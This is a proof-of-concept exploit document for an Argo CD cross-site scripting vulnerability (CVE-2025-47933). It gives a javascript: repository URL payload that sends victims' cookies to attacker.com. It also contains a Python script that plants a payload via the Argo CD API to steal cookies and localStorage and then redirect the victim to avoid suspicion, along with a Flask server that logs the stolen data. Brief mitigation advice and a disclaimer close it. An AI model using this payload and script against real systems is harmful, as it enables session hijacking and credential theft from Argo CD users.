# Proof of Concept Exploit for CVE-2025-47933 (Argo CD XSS)

This document demonstrates a proof of concept exploit for the Argo CD cross-site scripting vulnerability (CVE-2025-47933).

## Prerequisites

- Access to an Argo CD instance (version < 2.13.8, < 2.14.13, or < 3.0.4)
- User account with permissions to create/edit repositories

## Exploitation Steps

### Step 1: Access the Argo CD UI and Navigate to Settings

1. Log in to the Argo CD web interface
2. Navigate to Settings > Repositories
3. Click "Connect Repo" or edit an existing repository

### Step 2: Create a Repository with Malicious URL

When creating or editing a repository, enter a malicious URL that uses the `javascript:` protocol. The URL should be crafted to look like a valid Git repository URL but actually execute JavaScript code.

**Example malicious repository URL:**

```
javascript:fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)).then(()=>window.location='https://github.com/legitimate/repo')
```

This payload:
1. Sends the victim's cookies to the attacker's server
2. Redirects to a legitimate GitHub repository to avoid suspicion

### Step 3: Save the Repository Configuration

Click "Connect" or "Save" to store the repository with the malicious URL.

### Step 4: Share the Repository Link with the Victim

The attack is triggered when:
1. A victim with sufficient privileges views the repository details
2. The victim clicks on the repository URL link

## Proof of Concept Code

Below is a script that simulates the attack by creating a repository with a malicious URL using the Argo CD API:

```python
import requests
import json
import base64

# Configuration
ARGOCD_SERVER = "https://argocd.example.com"
USERNAME = "admin"
PASSWORD = "password"
ATTACKER_SERVER = "https://attacker.example.com"

# Step 1: Authenticate and get token
def get_auth_token():
    auth_url = f"{ARGOCD_SERVER}/api/v1/session"
    response = requests.post(auth_url, json={"username": USERNAME, "password": PASSWORD})
    return response.json()["token"]

# Step 2: Create repository with malicious URL
def create_malicious_repo(token):
    # Craft payload that steals cookies and session info
    malicious_js = f"""
    (function() {{
        // Steal cookies
        var data = {{
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            url: window.location.href
        }};
        
        // Send data to attacker server
        fetch('{ATTACKER_SERVER}/collect', {{
            method: 'POST',
            body: JSON.stringify(data),
            headers: {{'Content-Type': 'application/json'}}
        }})
        .then(() => {{
            // Redirect to legitimate repo to avoid suspicion
            window.location = 'https://github.com/argoproj/argo-cd';
        }});
    }})();
    """
    
    # Create a malicious repository URL with the javascript: protocol
    malicious_url = f"javascript:{malicious_js}"
    
    # Create repository via API
    repo_url = f"{ARGOCD_SERVER}/api/v1/repositories"
    repo_data = {
        "repo": malicious_url,
        "name": "legitimate-looking-repo",
        "type": "git",
        "project": "default"
    }
    
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.post(repo_url, json=repo_data, headers=headers)
    return response.json()

# Execute the attack
if __name__ == "__main__":
    try:
        token = get_auth_token()
        result = create_malicious_repo(token)
        print("Repository created successfully:")
        print(json.dumps(result, indent=2))
        print(f"\nAttack URL created. When a victim clicks on the repository URL, their data will be sent to {ATTACKER_SERVER}")
    except Exception as e:
        print(f"Error: {str(e)}")
```

## Attacker Server Setup

The attacker would need to set up a server to receive the stolen data. Here's a simple Flask server example:

```python
from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    timestamp = datetime.datetime.now().isoformat()
    
    # Log the stolen data
    with open('stolen_data.log', 'a') as f:
        f.write(f"[{timestamp}] New data received:\n")
        f.write(f"Cookies: {data.get('cookies')}\n")
        f.write(f"LocalStorage: {data.get('localStorage')}\n")
        f.write(f"URL: {data.get('url')}\n")
        f.write("-" * 50 + "\n")
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

## Mitigation

To protect against this vulnerability:

1. Update Argo CD to version 2.13.8, 2.14.13, or 3.0.4 or later
2. Implement proper Content Security Policy (CSP) headers
3. Limit repository management permissions to trusted users only

## Responsible Disclosure

This PoC is provided for educational purposes and to help security professionals understand and mitigate the vulnerability. Always obtain proper authorization before testing security vulnerabilities on any system.